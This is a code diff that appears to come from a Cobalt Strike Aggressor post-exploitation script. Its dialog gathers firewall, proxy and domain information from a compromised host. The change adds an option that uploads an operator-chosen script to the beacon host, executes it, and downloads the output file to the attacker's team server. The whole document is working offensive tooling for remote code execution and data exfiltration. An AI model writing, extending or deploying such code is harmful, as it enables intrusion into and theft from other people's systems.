@@ -74,10 +74,19 @@ sub domain{
 }
 
 sub main{
-    #show_message($3);
     foreach $func (keys($3)){
         if ($3[$func] eq 'true'){
             eval($func.'();');
+        }
+    }
+    if ($3['automatic'] ne ""){
+        bupload($bid, $3['automatic']);
+        #$fpath = $3['automatic'];
+        $fname = getFileName(replace($3['automatic'], '\\\\', "/"));
+        brun($bid,$fname);
+        if ($3['redirect'] ne ""){
+            show_message("You have filled in the redirection option, which will automatically download the redirection file to your team server after the script runs !");
+            bdownload($bid, $3['redirect']);
         }
     }
 }
@@ -103,6 +112,8 @@ sub main{
             drow_checkbox($dialog, "firewall", "Firewall configuration information", "");
             drow_checkbox($dialog, "proxy", "System proxy configuration information", "");
             drow_checkbox($dialog, "domain", "Domain informations", "");
+            drow_file($dialog, "automatic", "Use automatic script: ");
+            drow_text($dialog, "redirect", "Script output file[optional]: ");
             dbutton_action($dialog, "Run");
             dialog_show($dialog);
         }
